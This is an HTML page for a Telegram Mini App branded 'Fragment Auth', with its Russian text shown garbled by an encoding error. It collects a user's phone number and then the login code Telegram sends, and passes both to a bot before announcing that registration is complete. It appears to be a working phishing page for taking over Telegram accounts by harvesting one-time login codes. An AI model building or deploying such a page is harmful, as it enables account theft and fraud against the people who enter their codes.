<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div style="padding: 20px; text-align: center;">
        <h2>üîê Fragment Auth</h2>
        
        <div id="stepPhone">
            <p>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</p>
            <input type="tel" id="phone" placeholder="+79991234567" style="padding: 10px; margin: 10px;">
            <br>
            <button onclick="sendPhone()" style="padding: 10px 20px; margin: 10px;">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</button>
        </div>

        <div id="stepCode" style="display: none;">
            <p>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram:</p>
            <input type="text" id="code" placeholder="12345" style="padding: 10px; margin: 10px;">
            <br>
            <button onclick="sendCode()" style="padding: 10px 20px; margin: 10px;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>

        <div id="status" style="margin-top: 20px;"></div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let userPhone = '';

        function sendPhone() {
            const phone = document.getElementById('phone').value;
            if (!phone) {
                alert('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }
            
            userPhone = phone;
            
            // –ü–†–û–°–¢–û –û–¢–ü–†–ê–í–õ–Ø–ï–ú –î–ê–ù–ù–´–ï –í –ë–û–¢–ê
            const data = {
                action: 'send_phone',
                phone: phone
            };
            
            console.log('–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä:', data);
            
            // –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ
            try {
                tg.sendData(JSON.stringify(data));
                document.getElementById('status').innerHTML = '‚úÖ –ù–æ–º–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª–µ –¥–ª—è –∫–æ–¥–∞
                document.getElementById('stepPhone').style.display = 'none';
                document.getElementById('stepCode').style.display = 'block';
                
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', e);
                document.getElementById('status').innerHTML = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏';
            }
        }

        function sendCode() {
            const code = document.getElementById('code').value;
            if (!code) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥');
                return;
            }
            
            // –û–¢–ü–†–ê–í–õ–Ø–ï–ú –ö–û–î –í –ë–û–¢–ê
            const data = {
                action: 'send_code', 
                phone: userPhone,
                code: code
            };
            
            console.log('–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥:', data);
            
            try {
                tg.sendData(JSON.stringify(data));
                document.getElementById('status').innerHTML = '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞.';
                
                // –ó–∞–∫—Ä—ã–≤–∞–µ–º —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    tg.close();
                }, 2000);
                
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', e);
                document.getElementById('status').innerHTML = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞';
            }
        }

        // Enter –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendPhone();
        });

        document.getElementById('code').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });
    </script>
</body>
</html>
